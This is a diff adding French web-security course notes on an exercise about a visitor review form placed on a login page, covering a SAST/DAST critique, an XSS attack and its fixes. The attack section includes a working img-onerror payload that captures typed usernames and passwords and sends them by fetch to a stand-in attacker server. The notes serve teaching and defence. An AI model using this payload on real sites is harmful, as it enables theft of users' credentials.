@@ -209,3 +209,118 @@ Ajouter sur la page de login un formulaire qui permet de donner un avis. Affiche
 2 - Réaliser un attaque de type XSS avec ce formulaire.
 
 3 - Correction
+
+
+---
+
+## 1 - Critique du concept
+
+Mélanger des fonctionnalités d'**authentification** (la page de login) et des fonctionnalités de **contenu non approuvé / public** (les avis des visiteurs) est une très mauvaise pratique d'architecture de sécurité.
+
+Voici ce que révèlent les outils de scan :
+
+### Approche SAST (Analyse du code source)
+
+Un outil SAST (comme SonarQube, Semgrep ou Checkmarx) va scanner le code sans l'exécuter. Il lèvera immédiatement des alertes critiques :
+
+* **Violation du principe de moindre privilège / Isolation :** La page de login est la porte d'entrée de l'application. Y insérer un flux de données provenant d'utilisateurs non authentifiés augmente drastiquement la surface d'attaque à un endroit ultra-sensible.
+* **Absence de désinfection (Sanitization) :** Le SAST va suivre le chemin de la variable `review` (Source) jusqu'à son affichage dans le DOM ou son stockage en base (Sink). S'il ne détecte pas de fonction de nettoyage ou d'encodage (comme `textContent` ou des fonctions d'échappement HTML), il marquera le code comme **vulnérable aux failles d'injection (XSS/SQL)**.
+
+### Approche DAST (Analyse dynamique / au runtime)
+
+Un outil DAST (comme OWASP ZAP ou Burp Suite) va tester l'application en cours d'exécution en simulant des attaques.
+
+* **Détection de vecteurs XSS Stockés ou Réfléchis :** Le DAST va injecter des payloads dans le champ `review` et analyser les réponses HTTP. S'il voit que ses scripts s'exécutent dans le navigateur, la vulnérabilité est confirmée.
+* **Risque de vol de session (Session Hijacking) :** Si un attaquant réussit une XSS sur la page de login, il peut intercepter les identifiants (emails/mots de passe) au moment où les utilisateurs les tapent, ou voler les cookies de session si la page est partagée.
+
+---
+
+## 2 - Réalisation d'une attaque de type XSS (Cross-Site Scripting)
+
+Puisque l'avis est affiché sous le formulaire, si le développeur a utilisé une méthode non sécurisée pour injecter le texte (comme `innerHTML` en JavaScript, ou un affichage brut sans échappement en PHP/Java), la page devient vulnérable.
+
+### Payload XSS pour voler les identifiants en direct :
+
+Voici un exemple d'attaque plus évolué qu'un simple `alert()`. Ce script attend discrètement que la victime tape ses identifiants et les envoie vers un serveur contrôlé par l'attaquant :
+
+```html
+<img src="x" onerror="
+    const form = document.getElementById('loginForm');
+    if(form) {
+        form.addEventListener('submit', () => {
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
+            // Envoi des identifiants volés vers le serveur de l'attaquant
+            fetch('https://serveur-attaquant.com/log?u=' + encodeURIComponent(user) + '&p=' + encodeURIComponent(pass));
+        });
+    }
+">
+
+```
+
+**Pourquoi ça marche ?**
+La balise `<img>` cherche une image "x" qui n'existe pas. Cela déclenche immédiatement l'événement `onerror`, qui exécute le code JavaScript malveillant en arrière-plan sans que l'utilisateur ne s'en rende compte.
+
+---
+
+## 3 - Correction
+
+Pour valider les rapports SAST et DAST, la correction doit être appliquée à deux niveaux : l'architecture et le code.
+
+### A. Correction architecturale (Recommandée par le DAST/SAST)
+
+* **Séparation des contextes :** Supprimez le formulaire d'avis de la page de login. Les avis doivent être placés dans un espace dédié (ex: un tableau de bord après connexion, ou une page "Livre d'or" totalement isolée).
+
+### B. Correction technique dans le code
+
+#### Côté Front-end (JavaScript)
+
+Pour bloquer l'exécution des scripts injectés, il faut traiter l'avis comme du **texte brut** et non comme du code HTML.
+
+* **À bannir (Vulnérable) :**
+```javascript
+document.getElementById('displayReview').innerHTML = reviewText;
+
+```
+
+
+* **Sécurisé (Sûr) :**
+```javascript
+document.getElementById('displayReview').textContent = reviewText;
+// Ou element.innerText
+
+```
+
+
+
+#### Côté Back-end (Exemple en Node.js / Express)
+
+Si les avis sont enregistrés dans la base SQLite pour être réaffichés plus tard (XSS Stocké), il faut encoder les caractères spéciaux HTML avant l'affichage. Vous pouvez créer une fonction de nettoyage native :
+
+```javascript
+function escapeHTML(str) {
+    return str.replace(/[&<>"']/g, function(match) {
+        const chars = {
+            '&': '&amp;',
+            '<': '&lt;',
+            '>': '&gt;',
+            '"': '&quot;',
+            "'": '&#039;'
+        };
+        return chars[match];
+    });
+}
+
+// Utilisation avant enregistrement ou affichage
+const safeReview = escapeHTML(req.body.review);
+
+```
+
+En appliquant ces corrections, les outils **SAST** ne verront plus de chemin non sécurisé entre l'entrée et la sortie, et les outils **DAST** verront leurs payloads s'afficher inoffensivement sous forme de texte à l'écran (`<script>` s'affichera mot pour mot au lieu de s'exécuter).
+
+## TD Oauth
+Ajouter sur la page de login un formulaire qui permet de donner un avis. Afficher sous le formulaire l'avis des visiteurs.
+
+Avant de développer mettre en place une analyse de risques et des mesures de protection.
+
+On peut proposer une authentification via Oauth (google, facebook, github, twitter, linkedin, etc.) et expliquer les avantages et les risques de cette solution.
